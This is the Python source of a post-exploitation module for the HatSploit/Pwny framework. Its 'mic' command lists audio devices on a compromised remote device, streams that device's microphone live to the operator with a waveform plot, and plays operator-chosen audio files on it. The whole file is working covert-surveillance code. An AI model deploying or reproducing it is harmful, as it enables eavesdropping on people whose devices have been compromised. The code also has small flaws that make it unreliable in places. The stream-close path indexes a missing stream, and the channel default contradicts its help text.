"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import wave
import pyaudio
import threading

from pwny.api import *
from pwny.types import *

from badges.cmd import Command

import numpy as np
import matplotlib.pyplot as plt

from matplotlib.animation import FuncAnimation

CHUNK = 1024
WIDTH = 2

MIC_BASE = 6

MIC_PLAY = tlv_custom_tag(API_CALL_STATIC, MIC_BASE, API_CALL)
MIC_LIST = tlv_custom_tag(API_CALL_STATIC, MIC_BASE, API_CALL + 1)

MIC_PIPE = tlv_custom_pipe(PIPE_STATIC, MIC_BASE, PIPE_TYPE)


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "mic",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Use built-in microphone.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-l', '--list'),
                    {
                        'help': "List available audio devices.",
                        'action': 'store_true'
                    }
                ),
                (
                    ('-p', '--play'),
                    {
                        'help': "Play specified audio file.",
                        'metavar': 'FILE'
                    }
                ),
                (
                    ('-S', '--stream'),
                    {
                        'help': "Stream selected device.",
                        'metavar': 'ID',
                        'type': int
                    }
                ),
                (
                    ('-L',),
                    {
                        'help': "List actively streaming devices.",
                        'dest': 'streams',
                        'action': 'store_true'
                    }
                ),
                (
                    ('-c', '--close'),
                    {
                        'help': "Close all streams for device.",
                        'metavar': 'ID',
                        'type': int
                    }
                ),
                (
                    ('-o', '--output'),
                    {
                        'help': "Local file to save audio to (.wav).",
                        'metavar': 'FILE'
                    }
                ),
                (
                    ('-r', '--rate'),
                    {
                        'help': "Specify rate for audio (default: 48000)",
                        'type': int,
                        'default': 48000
                    }
                ),
                (
                    ('-C', '--channels'),
                    {
                        'help': "Specify number of channels (default: 2)",
                        'type': int,
                        'default': 1
                    }
                ),
                (
                    ('-f', '--format'),
                    {
                        'help': "Specify format (default: cd)",
                        'choices': ['cd', 'dat'],
                        'default': 'cd'
                    }
                )
            ]
        })

        self.running = {}

    def pipe_stream(self, frame, device):
        stream = self.running.get(device, None)

        if not stream:
            self.print_success("Suspended audio stream!")
            plt.close(stream['Figure'])
            return

        audio = self.session.pipes.read_pipe(
            pipe_type=MIC_PIPE,
            pipe_id=stream['ID'],
            size=CHUNK * WIDTH * 2
        )

        data = np.frombuffer(audio, dtype=np.int16)
        stream['Line'].set_ydata(data)

        try:
            stream['Stream'].write(audio)

        except Exception:
            self.print_error(f"Failed to stream audio!")

        return stream['Line'],

    def run(self, args):
        if args.list:
            result = self.session.send_command(
                tag=MIC_LIST
            )

            device = result.get_string(TLV_TYPE_STRING)
            id = 1

            while device:
                self.print_information(f"{str(id): <4}: {device}")
                id += 1

                device = result.get_string(TLV_TYPE_STRING)

        elif args.close:
            stream = self.running.get(args.close, None)

            if not stream:
                self.print_error(f"Device #{str(args.close)} not streaming!")
                return

            self.running.pop(args.close, None)
            self.print_process(f"Suspending device #{str(args.close)}...")

            self.session.pipes.destroy_pipe(MIC_PIPE, stream['ID'])

            stream['Stream'].stop_stream()
            stream['Stream'].close()

            stream['Audio'].terminate()

        elif args.streams:
            data = []

            for device, stream in self.running.items():
                data.append((device, stream['Stream']._rate))

            if not data:
                self.print_warning('No active streams running.')
                return

            self.print_table('Active streams', ('ID', 'Rate'), *data)

        elif args.stream:
            stream = self.running.get(args.stream, None)

            if stream:
                self.print_warning(f"Device #{str(args.stream)} is already streaming.")
                return

            try:
                pipe_id = self.session.pipes.create_pipe(
                    pipe_type=MIC_PIPE,
                    args={
                        TLV_TYPE_INT: args.stream
                    }
                )

            except RuntimeError:
                self.print_error(f"Failed to open device #{str(args.stream)}!")
                return

            self.print_process(f"Streaming device #{str(args.stream)}...")

            audio = pyaudio.PyAudio()
            stream = audio.open(
                format=pyaudio.paInt16,
                channels=args.channels,
                rate=args.rate,
                frames_per_buffer=CHUNK // WIDTH,
                output=True
            )

            fig, ax = plt.subplots()

            x = np.arange(0, 2048, 1)
            y = np.zeros(2048)

            line, = ax.plot(x, y, '-')

            ax.set_ylim(-32768, 32767)
            ax.set_xlim(0, 2048)
            ax.set_title("Audio Stream Visualization")
            ax.set_xlabel("Samples")
            ax.set_ylabel("Amplitude")

            self.running.update({
                args.stream: {
                    'Line': line,
                    'Figure': fig,
                    'Stream': stream,
                    'Audio': audio,
                    'ID': pipe_id,
                }
            })

            self.print_process("Visualizing live audio wave...")
            ani = FuncAnimation(fig, self.pipe_stream, blit=True, interval=1,
                                fargs=(args.stream,), cache_frame_data=False)
            plt.show()

        elif args.play:
            with open(args.play, 'rb') as f:
                self.print_process("Playing audio file on device...")

                result = self.session.send_command(
                    tag=MIC_PLAY,
                    args={
                        TLV_TYPE_BYTES: f.read(),
                    }
                )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to play audio file!")
                return
